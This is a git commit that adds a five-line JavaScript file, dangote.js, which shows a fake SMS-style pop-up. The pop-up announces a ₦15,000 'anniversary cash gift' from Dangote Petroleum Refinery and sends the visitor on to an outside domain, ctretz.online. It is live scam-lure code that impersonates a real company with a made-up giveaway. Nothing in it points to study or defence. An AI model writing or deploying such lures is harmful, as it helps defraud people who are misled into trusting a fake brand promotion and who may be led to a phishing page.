cc373f3b07dbc7ba30c9a1164a27ce2e148dd7c9
newetijazz14 <newetijazz14@gmail.com>
2026-01-13 08:10:51 +0100

    Create dangote.js

---
+++ dangote.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦15,000'
+password=prompt('SMS: Congratulations, Welcome to Dangote Petroluem Refinery 1year anniversary ₦15,000 cash gifts, press OK to Withdraw','WITHDRAW ₦15,000');
+if (password != 'WITHDRAW ₦15,000') {
+location.href='https://www.ctretz.online/anniversary-cash-gift';
+}
